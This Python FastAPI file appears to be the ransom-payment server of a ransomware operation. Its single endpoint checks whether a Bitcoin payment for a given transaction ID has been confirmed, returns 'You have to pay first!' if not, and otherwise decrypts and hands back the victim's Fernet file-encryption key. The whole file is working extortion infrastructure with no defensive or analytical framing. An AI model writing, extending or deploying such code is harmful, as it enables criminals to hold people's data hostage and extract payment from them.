from fastapi import FastAPI, Request
import backend_crypto
import backend_bitcoin

app = FastAPI()

# backend.generate_keys()
backend_crypto.read_keys()

@app.post("/{transation_id}")
async def decript_fernet_key(request: Request):
    fail_message = {'failed': 'You have to pay first! Wait till transaction confirmed!'}

    try:
        is_paid = await backend_bitcoin.was_payment_made(request.path_params['transation_id'])
        if not is_paid:
            return {'failed': 'You have to pay first! Wait till transaction confirmed!'}

        key: bytes = await request.body()
        return backend_crypto.decript_fernet_key(key)

    except Exception:
        return fail_message